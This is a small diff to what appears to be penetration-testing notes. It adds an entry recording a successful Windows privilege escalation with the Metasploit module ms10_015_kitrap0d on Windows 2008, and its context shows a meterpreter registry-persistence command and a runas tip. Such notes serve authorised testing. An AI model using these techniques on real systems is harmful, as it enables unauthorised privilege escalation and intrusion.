@@ -958,3 +958,7 @@ meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\
 To get things to run correctly:
 runas /user:netadmin (or whatever user) 
 ```
+#SUCCESS PRIVESC
+```bash
+exploit/windows/local/ms10_015_kitrap0d on a windows 2008 running as www
+```
